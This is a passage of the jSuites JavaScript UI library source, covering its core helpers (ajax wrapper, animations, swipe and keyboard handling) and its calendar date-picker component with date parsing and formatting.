/**
 * (c) jSuites Javascript Web Components
 *
 * Author: Paul Hodel <paul.hodel@gmail.com>
 * Website: https://bossanova.uk/jsuites/
 * Description: Create amazing web based applications.
 *
 * MIT License
 *
 */
;(function (global, factory) {
  typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory() :
  typeof define === 'function' && define.amd ? define(factory) :
  global.jSuites = factory();

  // Keep compatibility with jtools legacy
  global.jApp = global.jSuites;
}(this, (function () {

  'use strict';

var jSuites = function(options) {
  var obj = {}

  // Find root element
  obj.el = document.querySelector('.app');

  // Backdrop
  obj.backdrop = document.createElement('div');
  obj.backdrop.classList.add('jbackdrop');

  obj.getWindowWidth = function() {
      var w = window,
      d = document,
      e = d.documentElement,
      g = d.getElementsByTagName('body')[0],
      x = w.innerWidth || e.clientWidth || g.clientWidth;
      return x;
  }

  obj.getWindowHeight = function() {
      var w = window,
      d = document,
      e = d.documentElement,
      g = d.getElementsByTagName('body')[0],
      y = w.innerHeight|| e.clientHeight|| g.clientHeight;
      return  y;
  }

  obj.getPosition = function(e) {
      if (e.changedTouches && e.changedTouches[0]) {
          var x = e.changedTouches[0].pageX;
          var y = e.changedTouches[0].pageY;
      } else {
          var x = (window.Event) ? e.pageX : e.clientX + (document.documentElement.scrollLeft ? document.documentElement.scrollLeft : document.body.scrollLeft);
          var y = (window.Event) ? e.pageY : e.clientY + (document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop);
      }

      return [ x, y ];
  }

  obj.click = function(el) {
      // Create our event (with options)
      var evt = new MouseEvent('click', {
          bubbles: true,
          cancelable: true,
          view: window
      });
      el.dispatchEvent(evt);
  }

  obj.getElement = function(element, className) {
      var foundElement = false;

      function path (element) {
          if (element.className) {
              if (element.classList.contains(className)) {
                  foundElement = element;
              }
          }

          if (element.parentNode) {
              path(element.parentNode);
          }
      }

      path(element);

      return foundElement;
  }

  obj.getLinkElement = function(element) {
      var targetElement = false;

      function path (element) {
          if ((element.tagName == 'A' || element.tagName == 'DIV') && element.getAttribute('data-href')) {
              targetElement = element;
          }

          if (element.parentNode) {
              path(element.parentNode);
          }
      }

      path(element);

      return targetElement;
  }

  obj.getFormElements = function(formObject) {
      var ret = {};

      if (formObject) {
          var elements = formObject.querySelectorAll("input, select, textarea");
      } else {
          var elements = document.querySelectorAll("input, select, textarea");
      }

      for (var i = 0; i < elements.length; i++) {
          var element = elements[i];
          var name = element.name;
          var value = element.value;

          if (name) {
              ret[name] = value;
          }
      }

      return ret;
  }

  obj.exists = function(url, __callback) {
      var http = new XMLHttpRequest();
      http.open('HEAD', url, false);
      http.send();
      if (http.status) {
          __callback(http.status);
      }
  }

  obj.getFiles = function(element) {
      if (! element) {
          console.error('No element defined in the arguments of your method');
      }

      // Get attachments
      var files = element.querySelectorAll('.jfile');

      if (files.length > 0) {
          var data = [];
          for (var i = 0; i < files.length; i++) {
              var file = {};

              if (files[i].classList.contains('jremove')) {
                  file.remove = 1;
                  file.file = files[i].getAttribute('src');
                  var extension = file.file.split('.');
                  file.extension = extension[extension.length-1];
              } else {
                  file.name = files[i].getAttribute('data-name').toLowerCase()
                  file.size = files[i].getAttribute('data-size');
                  file.lastmodified = files[i].getAttribute('data-lastmodified');

                  if (files[i].getAttribute('data-cover')) {
                      file.cover = files[i].getAttribute('data-cover');
                  }

                  // File thumbs
                  var content = files[i].getAttribute('data-thumbs');

                  if (content) {
                      if (content.substr(0,4) == 'data') {
                          var content = files[i].getAttribute('data-thumbs').split(',');
                          file.thumbs = content[1];
                      } else {
                          file.thumbs = content;
                      }
                  }

                  // File content
                  var content = files[i].getAttribute('src');

                  if (content.substr(0,4) == 'data') {
                      var content = files[i].getAttribute('src').split(',');
                      file.content = content[1];

                      var extension = files[i].getAttribute('src').split(';');
                      extension = extension[0].split('/');
                      file.extension = extension[1];
                  } else {
                      file.file = files[i].getAttribute('src');
                      var extension = file.file.split('.');
                      file.extension = extension[extension.length-1];
                  }
              }

              data[i] = file;
          }

          return data;
      }
  }

  obj.ajax = function(postOptions) {
      if (! postOptions.data) {
          postOptions.data = {};
      }
      // Alias for method
      if (postOptions.type) {
          postOptions.method = postOptions.type;
      }

      if (postOptions.method == 'GET') {
          if (postOptions.dataType == 'json') {
              fetch(postOptions.url, { headers: new Headers({ 'content-type': 'text/json' }) }).then(function(data) {
                  data.json().then(function(result) {
                      if (postOptions.success && typeof(postOptions.success) == 'function') {
                          postOptions.success(result);
                      }
                  })
              });
          }
      } else {
          // Data
          var data = new URLSearchParams();
          var keys = Object.keys(postOptions.data);
          if (keys.length) {
              for (var i = 0; i < keys.length; i++) {
                  if (typeof(postOptions.data[keys[i]]) == 'object') {
                      var o = postOptions.data[keys[i]];
                      for (var j = 0; j < o.length; j++) {
                          if (typeof(o[j]) == 'string') {
                              data.append(keys[i] + '[' + j + ']', o[j]);
                          } else {
                              var prop = Object.keys(o[j]);
                              for (var z = 0; z < prop.length; z++) {
                                  data.append(keys[i] + '[' + j + '][' + prop[z] + ']', o[j][prop[z]]);
                              }
                          }
                      }
                  } else {
                      data.append(keys[i], postOptions.data[keys[i]]);
                  }
              }
          }

          // Remote call
          fetch(postOptions.url, {
              method: postOptions.method ? postOptions.method : 'POST',
              headers: new Headers({
                  'Accept': 'application/json',
                  'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
              }),
              body: data
          })
          .then(function(data) {
                  data.json().then(function(result) {
                      if (postOptions.success && typeof(postOptions.success) == 'function') {
                          postOptions.success(result);
                      }
                  })
          });

      }
  }

  obj.slideLeft = function(element, direction, done) {
      if (direction == true) {
          element.classList.add('slide-left-in');
          setTimeout(function() {
              element.classList.remove('slide-left-in');
              if (typeof(done) == 'function') {
                  done();
              }
          }, 400);
      } else {
          element.classList.add('slide-left-out');
          setTimeout(function() {
              element.classList.remove('slide-left-out');
              if (typeof(done) == 'function') {
                  done();
              }
          }, 400);
      }
  }

  obj.slideRight = function(element, direction, done) {
      if (direction == true) {
          element.classList.add('slide-right-in');
          setTimeout(function() {
              element.classList.remove('slide-right-in');
              if (typeof(done) == 'function') {
                  done();
              }
          }, 400);
      } else {
          element.classList.add('slide-right-out');
          setTimeout(function() {
              element.classList.remove('slide-right-out');
              if (typeof(done) == 'function') {
                  done();
              }
          }, 400);
      }
  }

  obj.slideTop = function(element, direction, done) {
      if (direction == true) {
          element.classList.add('slide-top-in');
          setTimeout(function() {
              element.classList.remove('slide-top-in');
              if (typeof(done) == 'function') {
                  done();
              }
          }, 400);
      } else {
          element.classList.add('slide-top-out');
          setTimeout(function() {
              element.classList.remove('slide-top-out');
              if (typeof(done) == 'function') {
                  done();
              }
          }, 400);
      }
  }

  obj.slideBottom = function(element, direction, done) {
      if (direction == true) {
          element.classList.add('slide-bottom-in');
          setTimeout(function() {
              element.classList.remove('slide-bottom-in');
              if (typeof(done) == 'function') {
                  done();
              }
          }, 400);
      } else {
          element.classList.add('slide-bottom-out');
          setTimeout(function() {
              element.classList.remove('slide-bottom-out');
              if (typeof(done) == 'function') {
                  done();
              }
          }, 400);
      }
  }

  obj.fadeIn = function(element, done) {
      element.classList.add('fade-in');
      setTimeout(function() {
          element.classList.remove('fade-in');
          if (typeof(done) == 'function') {
              done();
          }
      }, 2000);
  }

  obj.fadeOut = function(element, done) {
      element.classList.add('fade-out');
      setTimeout(function() {
          element.classList.remove('fade-out');
          if (typeof(done) == 'function') {
              done();
          }
      }, 1000);
  }

  obj.keyDownControls = function(e) {
      if (e.which == 27) {
          var nodes = document.querySelectorAll('.jmodal');
          if (nodes.length > 0) {
              for (var i = 0; i < nodes.length; i++) {
                  nodes[i].modal.close();
              }
          }

          var nodes = document.querySelectorAll('.jslider');
          if (nodes.length > 0) {
              for (var i = 0; i < nodes.length; i++) {
                  nodes[i].slider.close();
              }
          }

          if (document.querySelector('.jdialog')) {
              jSuites.dialog.close();
          }
      } else if (e.which == 13) {
          if (document.querySelector('.jdialog')) {
              if (typeof(jSuites.dialog.options.onconfirm) == 'function') {
                  jSuites.dialog.options.onconfirm();
              }
              jSuites.dialog.close();
          }
      }

      // Verify mask
      if (jSuites.mask) {
          jSuites.mask.apply(e);
      }
  }

  obj.actionUpControl = function(e) {
      var element = null;
      if (element = jSuites.getLinkElement(e.target)) {
          var link = element.getAttribute('data-href');
          if (link == '#back') {
              window.history.back();
          } else if (link == '#panel') {
              jSuites.panel();
          } else {
              jSuites.pages(link);
          }
      }
  }

  var controlSwipeLeft = function(e) {
      var element = jSuites.getElement(e.target, 'option');

      if (element && element.querySelector('.option-actions')) {
          element.scrollTo({
              left: 100,
              behavior: 'smooth'
          });
      } else {
          var element = jSuites.getElement(e.target, 'jcalendar');
          if (element && jSuites.calendar.current) {
              jSuites.calendar.current.prev();
          } else {
              if (jSuites.panel.get()) {
                  jSuites.panel.close();
              }
          }
      }
  }
  
  var controlSwipeRight = function(e) {
      var element = jSuites.getElement(e.target, 'option');
      if (element && element.querySelector('.option-actions')) {
          element.scrollTo({
              left: 0,
              behavior: 'smooth'
          });
      } else {
          var element = jSuites.getElement(e.target, 'jcalendar');
          if (element && jSuites.calendar.current) {
              jSuites.calendar.current.next();
          } else {
              var element = jSuites.panel.get();
              if (element) {
                  if (element.style.display == 'none') {
                      jSuites.panel();
                  }
              }
          }
      }
  }

  // Create page container
  document.addEventListener('swipeleft', controlSwipeLeft);
  document.addEventListener('swiperight', controlSwipeRight);
  document.addEventListener('touchend', obj.actionUpControl);
  document.addEventListener('keydown', obj.keyDownControls);

  // Pop state control
  window.onpopstate = function(e) {
      if (e.state && e.state.route) {
          if (jSuites.pages.get(e.state.route)) {
              jSuites.pages(e.state.route, true);
          }
      }
  }

  return obj;
}();


jSuites.calendar = (function(el, options) {
  var obj = {};
  obj.options = {};

  // Global container
  if (! jSuites.dropdown.current) {
      jSuites.dropdown.current = null;
  }

  // Default configuration
  var defaults = {
      // Date format
      format:'DD/MM/YYYY',
      // Allow keyboard date entry
      readonly:0,
      // Today is default
      today:0,
      // Show timepicker
      time:0,
      // Show the reset button
      resetButton:true,
      // Placeholder
      placeholder:'',
      // Translations can be done here
      months:['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
      weekdays:['Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday'],
      weekdays_short:['S', 'M', 'T', 'W', 'T', 'F', 'S'],
      // Value
      value:null,
      // Events
      onclose:null,
      onchange:null,
      // Fullscreen (this is automatic set for screensize < 800)
      fullscreen:false,
      // Internal mode controller
      mode:null,
      position:null,
  };

  // Loop through our object
  for (var property in defaults) {
      if (options && options.hasOwnProperty(property)) {
          obj.options[property] = options[property];
      } else {
          obj.options[property] = defaults[property];
      }
  }

  // Value
  if (! obj.options.value && el.value) {
      obj.options.value = el.value;
  }

  // Make sure use upper case in the format
  obj.options.format = obj.options.format.toUpperCase();

  if (obj.options.value) {
      var date = obj.options.value.split(' ');
      var time = date[1];
      var date = date[0].split('-');
      var y = parseInt(date[0]);
      var m = parseInt(date[1]);
      var d = parseInt(date[2]);

      if (time) {
          var time = time.split(':');
          var h = parseInt(time[0]);
          var i = parseInt(time[1]);
      } else {
          var h = 0;
          var i = 0;
      }
  } else {
      var date = new Date();
      var y = date.getFullYear();
      var m = date.getMonth() + 1;
      var d = date.getDate();
      var h = date.getHours();
      var i = date.getMinutes();
  }

  // Current value
  obj.date = [ y, m, d, h, i, 0 ];

  // Two digits
  var two = function(value) {
      value = '' + value;
      if (value.length == 1) {
          value = '0' + value;
      }
      return value;
  }

  // Calendar elements
  var calendarReset = document.createElement('div');
  calendarReset.className = 'jcalendar-reset';
  calendarReset.innerHTML = 'Reset';

  var calendarConfirm = document.createElement('div');
  calendarConfirm.className = 'jcalendar-confirm';
  calendarConfirm.innerHTML = 'Done';

  var calendarControls = document.createElement('div');
  calendarControls.className = 'jcalendar-controls'
  if (obj.options.resetButton) {
      calendarControls.appendChild(calendarReset);
  }
  calendarControls.appendChild(calendarConfirm);

  var calendarContainer = document.createElement('div');
  calendarContainer.className = 'jcalendar-container';

  var calendarContent = document.createElement('div');
  calendarContent.className = 'jcalendar-content';
  calendarContent.appendChild(calendarControls);
  calendarContainer.appendChild(calendarContent);

  // Main element
  var calendar = document.createElement('div');
  calendar.className = 'jcalendar';
  calendar.appendChild(calendarContainer);

  // Previous button
  var calendarHeaderPrev = document.createElement('td');
  calendarHeaderPrev.setAttribute('colspan', '2');
  calendarHeaderPrev.className = 'jcalendar-prev';

  // Header with year and month
  var calendarLabelYear = document.createElement('span');
  calendarLabelYear.className = 'jcalendar-year';

  var calendarLabelMonth = document.createElement('span');
  calendarLabelMonth.className = 'jcalendar-month';

  var calendarHeaderTitle = document.createElement('td');
  calendarHeaderTitle.className = 'jcalendar-header';
  calendarHeaderTitle.setAttribute('colspan', '3');
  calendarHeaderTitle.appendChild(calendarLabelMonth);
  calendarHeaderTitle.appendChild(calendarLabelYear);

  var calendarHeaderNext = document.createElement('td');
  calendarHeaderNext.setAttribute('colspan', '2');
  calendarHeaderNext.className = 'jcalendar-next';

  var calendarHeaderRow = document.createElement('tr');
  calendarHeaderRow.appendChild(calendarHeaderPrev);
  calendarHeaderRow.appendChild(calendarHeaderTitle);
  calendarHeaderRow.appendChild(calendarHeaderNext);

  var calendarHeader = document.createElement('thead');
  calendarHeader.appendChild(calendarHeaderRow);

  var calendarBody = document.createElement('tbody');
  var calendarFooter = document.createElement('tfoot');

  // Calendar table
  var calendarTable = document.createElement('table');
  calendarTable.setAttribute('cellpadding', '0');
  calendarTable.setAttribute('cellspacing', '0');
  calendarTable.appendChild(calendarHeader);
  calendarTable.appendChild(calendarBody);
  calendarTable.appendChild(calendarFooter);
  calendarContent.appendChild(calendarTable);

  var calendarSelectHour = document.createElement('select');
  calendarSelectHour.onchange = function() {
      obj.date[3] = this.value; 
  }

  for (var i = 0; i < 24; i++) {
      var element = document.createElement('option');
      element.value = i;
      element.innerHTML = two(i);
      calendarSelectHour.appendChild(element);
  }

  var calendarSelectMin = document.createElement('select');
  calendarSelectMin.onchange = function() {
      obj.date[4] = this.value; 
  }

  for (var i = 0; i < 60; i++) {
      var element = document.createElement('option');
      element.value = i;
      element.innerHTML = two(i);
      calendarSelectMin.appendChild(element);
  }

  // Footer controls
  var calendarControls = document.createElement('div');
  calendarControls.className = 'jcalendar-controls';

  var calendarControlsTime = document.createElement('div');
  calendarControlsTime.className = 'jcalendar-time';
  calendarControlsTime.style.maxWidth = '140px';
  calendarControlsTime.appendChild(calendarSelectHour);
  calendarControlsTime.appendChild(calendarSelectMin);

  var calendarControlsUpdate = document.createElement('div');
  calendarControlsUpdate.style.flexGrow = '10';
  calendarControlsUpdate.innerHTML = '<input type="button" class="jcalendar-update" value="Update">'
  calendarControls.appendChild(calendarControlsTime);
  calendarControls.appendChild(calendarControlsUpdate);
  calendarContent.appendChild(calendarControls);

  var calendarBackdrop = document.createElement('div');
  calendarBackdrop.className = 'jcalendar-backdrop';
  calendar.appendChild(calendarBackdrop);

  // Methods
  obj.open = function (value) {
      if (jSuites.calendar.current) {
          if (jSuites.calendar.current != obj) {
              jSuites.calendar.current.close();
          }
      }

      if (! jSuites.calendar.current) {
          jSuites.calendar.current = obj;
          // Show calendar
          calendar.classList.add('jcalendar-focus');
          // Get days
          obj.getDays();
          // Hour
          if (obj.options.time) {
              calendarSelectHour.value = obj.date[3];
              calendarSelectMin.value = obj.date[4];
          }

          // Get the position of the corner helper
          if (jSuites.getWindowWidth() < 800 || obj.options.fullscreen) {
              // Full
              calendar.classList.add('jcalendar-fullsize');
              // Animation
              calendarContent.classList.add('slide-bottom-in');
          } else {
              const rect = el.getBoundingClientRect();
              const rectContent = calendarContent.getBoundingClientRect();

              if (obj.options.position) {
                  calendarContainer.style.position = 'fixed';
                  if (window.innerHeight < rect.bottom + rectContent.height) {
                      calendarContainer.style.top = (rect.top - (rectContent.height + 2)) + 'px';
                  } else {
                      calendarContainer.style.top = (rect.top + rect.height + 2) + 'px';
                  }
              } else {
                  if (window.innerHeight < rect.bottom + rectContent.height) {
                      calendarContainer.style.bottom = (1 * rect.height + rectContent.height + 2) + 'px';
                  } else {
                      calendarContainer.style.top = 2 + 'px'; 
                  }
              }
          }
      }
  }

  obj.close = function (ignoreEvents, update) {
      if (jSuites.calendar.current) {
          jSuites.calendar.current =  null;

          if (update != false && el.tagName == 'INPUT') {
              obj.setValue(obj.getValue());
          }

          if (! ignoreEvents && typeof(obj.options.onclose) == 'function') {
              obj.options.onclose(el);
          }

          // Animation
          calendarContainer.classList.remove('slide-bottom-in');
          calendar.classList.remove('jcalendar-focus');
      }

      return obj.getValue(); 
  }

  obj.prev = function() {
      // Check if the visualization is the days picker or years picker
      if (obj.options.mode == 'years') {
          obj.date[0] = obj.date[0] - 12;

          // Update picker table of days
          obj.getYears();
      } else {
          // Go to the previous month
          if (obj.date[1] < 2) {
              obj.date[0] = obj.date[0] - 1;
              obj.date[1] = 1;
          } else {
              obj.date[1] = obj.date[1] - 1;
          }

          // Update picker table of days
          obj.getDays();
      }
  }

  obj.next = function() {
      // Check if the visualization is the days picker or years picker
      if (obj.options.mode == 'years') {
          obj.date[0] = parseInt(obj.date[0]) + 12;

          // Update picker table of days
          obj.getYears();
      } else {
          // Go to the previous month
          if (obj.date[1] > 11) {
              obj.date[0] = obj.date[0] + 1;
              obj.date[1] = 1;
          } else {
              obj.date[1] = obj.date[1] + 1;
          }

          // Update picker table of days
          obj.getDays();
      }
  }

  obj.setValue = function(val) {
      if (val) {
          // Keep value
          obj.options.value = val;
          // Set label
          var value = obj.setLabel(val, obj.options.format);
          var date = obj.options.value.split(' ');
          if (! date[1]) {
              date[1] = '00:00:00';
          }
          var time = date[1].split(':')
          var date = date[0].split('-');
          var y = parseInt(date[0]);
          var m = parseInt(date[1]);
          var d = parseInt(date[2]);
          var h = parseInt(time[0]);
          var i = parseInt(time[1]);
          obj.date = [ y, m, d, h, i, 0 ];
          var val = obj.setLabel(val, obj.options.format);

          if (el.value != val) {
              el.value = val;
              // On change
              if (typeof(obj.options.onchange) ==  'function') {
                  obj.options.onchange(el, val, obj.date);
              }
          }

          obj.getDays();
      }
  }

  obj.getValue = function() {
      if (obj.date) {
          if (obj.options.time) {
              return two(obj.date[0]) + '-' + two(obj.date[1]) + '-' + two(obj.date[2]) + ' ' + two(obj.date[3]) + ':' + two(obj.date[4]) + ':' + two(0);
          } else {
              return two(obj.date[0]) + '-' + two(obj.date[1]) + '-' + two(obj.date[2]) + ' ' + two(0) + ':' + two(0) + ':' + two(0);
          }
      } else {
          return "";
      }
  }

  /**
   * Update calendar
   */
  obj.update = function(element) {
      obj.date[2] = element.innerText;

      if (! obj.options.time) {
          obj.close();
      } else {
          obj.date[3] = calendarSelectHour.value;
          obj.date[4] = calendarSelectMin.value;
      }

      var elements = calendar.querySelector('.jcalendar-selected');
      if (elements) {
          elements.classList.remove('jcalendar-selected');
      }
      element.classList.add('jcalendar-selected')
  }

  /**
   * Set to blank
   */
  obj.reset = function() {
      // Clear element
      obj.date = null;
      // Reset element
      el.value = '';
      // Close calendar
      obj.close();
  }

  /**
   * Get calendar days
   */
  obj.getDays = function() {
      // Mode
      obj.options.mode = 'days';

      // Variables
      var d = 0;
      var today = 0;
      var today_d = 0;
      var calendar_day;

      // Setting current values in case of NULLs
      var date = new Date();

      var year = obj.date && obj.date[0] ? obj.date[0] : parseInt(date.getFullYear());
      var month = obj.date && obj.date[1] ? obj.date[1] : parseInt(date.getMonth()) + 1;
      var day = obj.date && obj.date[2] ? obj.date[2] : parseInt(date.getDay());
      var hour = obj.date && obj.date[3] ? obj.date[3] : parseInt(date.getHours());
      var min = obj.date && obj.date[4] ? obj.date[4] : parseInt(date.getMinutes());

      obj.date = [year, month, day, hour, min, 0 ];

      // Update title
      calendarLabelYear.innerHTML = year;
      calendarLabelMonth.innerHTML = obj.options.months[month - 1];

      // Flag if this is the current month and year
      if ((date.getMonth() == month-1) && (date.getFullYear() == year)) {
          today = 1;
          today_d = date.getDate();
      }

      var date = new Date(year, month, 0, 0, 0);
      var nd = date.getDate();

      var date = new Date(year, month-1, 0, hour, min);
      var fd = date.getDay() + 1;

      // Reset table
      calendarBody.innerHTML = '';

      // Weekdays Row
      var row = document.createElement('tr');
      row.setAttribute('align', 'center');
      calendarBody.appendChild(row);

      for (var i = 0; i < 7; i++) {
          var cell = document.createElement('td');
          cell.setAttribute('width', '30');
          cell.classList.add('jcalendar-weekday')
          cell.innerHTML = obj.options.weekdays_short[i];
          row.appendChild(cell);
      }

      // Avoid a blank line
      if (fd == 7) {
          var j = 7;
      } else {
          var j = 0;
      }

      // Days inside the table
      var row = document.createElement('tr');
      row.setAttribute('align', 'center');
      calendarBody.appendChild(row);

      // Days in the month
      for (var i = j; i < (Math.ceil((nd + fd) / 7) * 7); i++) {
          // Create row
          if ((i > 0) && (!(i % 7))) {
              var row = document.createElement('tr');
              row.setAttribute('align', 'center');
              calendarBody.appendChild(row);
          }

          if ((i >= fd) && (i < nd + fd)) {
              d += 1;
          } else {
              d = 0;
          }

          // Create cell
          var cell = document.createElement('td');
          cell.setAttribute('width', '30');
          cell.classList.add('jcalendar-set-day');
          row.appendChild(cell);

          if (d == 0) {
              cell.innerHTML = '';
          } else {
              if (d < 10) {
                  cell.innerHTML = 0 + d;
              } else {
                  cell.innerHTML = d;
              }
          }

          // Selected
          if (d && d == day) {
              cell.classList.add('jcalendar-selected');
          }

          // Sundays
          if (! (i % 7)) {
              cell.style.color = 'red';
          }

          // Today
          if ((today == 1) && (today_d == d)) {
              cell.style.fontWeight = 'bold';
          }
      }

      // Show time controls
      if (obj.options.time) {
          calendarControlsTime.style.display = '';
      } else {
          calendarControlsTime.style.display = 'none';
      }
  }

  obj.getMonths = function() {
      // Mode
      obj.options.mode = 'months';

      // Loading month labels
      var months = obj.options.months;

      // Update title
      calendarLabelYear.innerHTML = obj.date[0];
      calendarLabelMonth.innerHTML = '';

      // Create months table
      var html = '<td colspan="7"><table width="100%"><tr align="center">';

      for (i = 0; i < 12; i++) {
          if ((i > 0) && (!(i % 4))) {
              html += '</tr><tr align="center">';
          }
          month = parseInt(i) + 1;
          html += '<td class="jcalendar-set-month" data-value="' + month + '">' + months[i] +'</td>';
      }

      html += '</tr></table></td>';

      calendarBody.innerHTML = html;
  }

  obj.getYears = function() { 
      // Mode
      obj.options.mode = 'years';

      // Array of years
      var y = [];
      for (i = 0; i < 25; i++) {
          y[i] = parseInt(obj.date[0]) + (i - 12);
      }

      // Assembling the year tables
      var html = '<td colspan="7"><table width="100%"><tr align="center">';

      for (i = 0; i < 25; i++) {
          if ((i > 0) && (!(i % 5))) {
              html += '</tr><tr align="center">';
          }
          html += '<td class="jcalendar-set-year">'+ y[i] +'</td>';
      }

      html += '</tr></table></td>';

      calendarBody.innerHTML = html;
  }

  obj.setLabel = function(value, format) {
      return jSuites.calendar.getDateString(value, format);
  }

  obj.fromFormatted = function (value, format) {
      return jSuites.calendar.extractDateFromString(value, format);
  }

  // Add properties
  el.setAttribute('autocomplete', 'off');
  el.setAttribute('data-mask', obj.options.format.toLowerCase());

  if (obj.options.readonly) {
      el.setAttribute('readonly', 'readonly');
  }

  if (obj.options.placeholder) {
      el.setAttribute('placeholder', obj.options.placeholder);
  }

  // Handle events
  el.addEventListener("focus", function(e) {
      obj.open();
  });

  el.addEventListener("mousedown", function(e) {
      e.preventDefault();
      e.stopImmediatePropagation();
      obj.open();
  });

  el.addEventListener("keyup", function(e) {
      if (e.target.value && e.target.value.length > 3) {
          var test = jSuites.calendar.extractDateFromString(e.target.value, obj.options.format);
          if (test) {
              if (e.target.getAttribute('data-completed') == 'true') {
                  obj.setValue(test);
              }
          }
      }
  });

  if (! jSuites.calendar.hasEvents) {
      // Add global events
      document.addEventListener("swipeleft", function(e) {
          if (calendar.classList.contains('jcalendar-focus')) {
              obj.prev();
          }
      });

      document.addEventListener("swiperight", function(e) {
          if (calendar.classList.contains('jcalendar-focus')) {
              obj.next();
          }
      });

      document.addEventListener("mousedown", jSuites.calendar.mouseDownControls);

      // Has events
      jSuites.calendar.hasEvents = true;
  }

  // Append element to the DOM
  el.parentNode.insertBefore(calendar, el.nextSibling);

  // Keep object available from the node
  el.calendar = obj;

  return obj;
});

jSuites.calendar.prettify = function(d, texts) {
  if (! texts) {
      var texts = {
          justNow: 'Just now',
          xMinutesAgo: '{0} minutes ago',
          xHoursAgo: '{0} hours ago',
          xDaysAgo: '{0} days ago',
          xWeeksAgo: '{0} weeks ago',
          xMonthsAgo: '{0} months ago',
          xYearsAgo: '{0} years ago',
      }
  }

  var d1 = new Date();
  var d2 = new Date(d);
  var total = parseInt((d1 - d2) / 1000 / 60);

  String.prototype.format = function(o) {
      return this.replace('{0}', o);
  }

  if (total == 0) {
      var text = texts.justNow;
  } else if (total < 90) {
      var text = texts.xMinutesAgo.format(total);
  } else if (total < 1440) { // One day
      var text = texts.xHoursAgo.format(Math.round(total/60));
  } else if (total < 20160) { // 14 days
      var text = texts.xDaysAgo.format(Math.round(total / 1440));
  } else if (total < 43200) { // 30 days
      var text = texts.xWeeksAgo.format(Math.round(total / 10080));
  } else if (total < 1036800) { // 24 months
      var text = texts.xMonthsAgo.format(Math.round(total / 43200));
  } else { // 24 months+
      var text = texts.xYearsAgo.format(Math.round(total / 525600));
  }

  return text;
}

jSuites.calendar.prettifyAll = function() {
  var elements = document.querySelectorAll('.prettydate');
  for (var i = 0; i < elements.length; i++) {
      if (elements[i].getAttribute('data-date')) {
          elements[i].innerHTML = jSuites.calendar.prettify(elements[i].getAttribute('data-date'));
      } else {
          elements[i].setAttribute('data-date', elements[i].innerHTML);
          elements[i].innerHTML = jSuites.calendar.prettify(elements[i].innerHTML);
      }
  }
}

jSuites.calendar.now = function() {
  var date = new Date();
  var y = date.getFullYear();
  var m = date.getMonth() + 1;
  var d = date.getDate();
  var h = date.getHours();
  var i = date.getMinutes();
  var s = date.getSeconds();

  // Two digits
  var two = function(value) {
      value = '' + value;
      if (value.length == 1) {
          value = '0' + value;
      }
      return value;
  }

  return two(y) + '-' + two(m) + '-' + two(d) + ' ' + two(h) + ':' + two(i) + ':' + two(s);
}

// Helper to extract date from a string
jSuites.calendar.extractDateFromString = function(date, format) {
  var v1 = '' + date;
  var v2 = format.replace(/[0-9]/g,'');

  var test = 1;

  // Get year
  var y = v2.search("YYYY");
  y = v1.substr(y,4);
  if (parseInt(y) != y) {
      test = 0;
  }

  // Get month
  var m = v2.search("MM");
  m = v1.substr(m,2);
  if (parseInt(m) != m || d > 12) {
      test = 0;
  }

  // Get day
  var d = v2.search("DD");
  d = v1.substr(d,2);
  if (parseInt(d) != d  || d > 31) {
      test = 0;
  }

  // Get hour
  var h = v2.search("HH");
  if (h >= 0) {
      h = v1.substr(h,2);
      if (! parseInt(h) || h > 23) {
          h = '00';
      }
  } else {
      h = '00';
  }
  
  // Get minutes
  var i = v2.search("MI");
  if (i >= 0) {
      i = v1.substr(i,2);
      if (! parseInt(i) || i > 59) {
          i = '00';
      }
  } else {
      i = '00';
  }

  // Get seconds
  var s = v2.search("SS");
  if (s >= 0) {
      s = v1.substr(s,2);
      if (! parseInt(s) || s > 59) {
          s = '00';
      }
  } else {
      s = '00';
  }

  if (test == 1 && date.length == format.length) {
      // Update source
      var data = y + '-' + m + '-' + d + ' ' + h + ':' +  i + ':' + s;

      return data;
  }

  return '';
}

// Helper to convert date into string
jSuites.calendar.getDateString = function(value, format) {
  // Default calendar
  if (! format) {
      var format = 'DD/MM/YYYY';
  }

  if (value) {
      var d = ''+value;
      d = d.split(' ');

      var h = '';
      var m = '';
      var s = '';

      if (d[1]) {
          h = d[1].split(':');
          m = h[1];
          s = h[2];
          h = h[0];
      } else {
          h = '00';
          m = '00';
          s = '00';
      }

      d = d[0].split('-');

      if (d[0] && d[1] && d[2] && d[0] > 0 && d[1] > 0 && d[1] < 13 && d[2] > 0 && d[2] < 32) {
          var calendar = new Date(d[0], d[1]-1, d[2]);
          var weekday = new Array('Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday');

          d[1] = (d[1].length < 2 ? '0' : '') + d[1];
          d[2] = (d[2].length < 2 ? '0' : '') + d[2];
          h = (h.length < 2 ? '0' : '') + h;
          m = (m.length < 2 ? '0' : '') + m;
          s = (s.length < 2 ? '0' : '') + s;

          value = format;
          value = value.replace('WD', weekday[calendar.getDay()]);
          value = value.replace('DD', d[2]);
          value = value.replace('MM', d[1]);
          value = value.replace('YYYY', d[0]);
          value = value.replace('YY', d[0].substring(2,4));

          if (h) {
              value = value.replace('HH24', h);
          }

          if (h > 12) {
              value = value.replace('HH12', h - 12);
              value = value.replace('HH', h);
          } else {
              value = value.replace('HH12', h);
              value = value.replace('HH', h);
          }

          value = value.replace('MI', m);
          value = value.replace('MM', m);
          value = value.replace('SS', s);
      } else {
          value = '';
      }
  }

  return value;
}

jSuites.calendar.mouseDownControls = function(e) {
  if (! jSuites.getElement(e.target, 'jcalendar')) {
      if (jSuites.calendar.current) {
          jSuites.calendar.current.close(false, false);
      }
  } else {
      if (jSuites.calendar.current) {
          var action = e.target.className;

          // Object id
          if (action == 'jcalendar-prev') {
              jSuites.calendar.current.prev();
          } else if (action == 'jcalendar-next') {
              jSuites.calendar.current.next();
          } else if (action == 'jcalendar-month') {
              jSuites.calendar.current.getMonths();
          } else if (action == 'jcalendar-year') {
              jSuites.calendar.current.getYears();
          } else if (action == 'jcalendar-set-year') {
              jSuites.calendar.current.date[0] = e.target.innerText;
              jSuites.calendar.current.getDays();
          } else if (action == 'jcalendar-set-month') {
              jSuites.calendar.current.date[1] = parseInt(e.target.getAttribute('data-value'));
              jSuites.calendar.current.getDays();
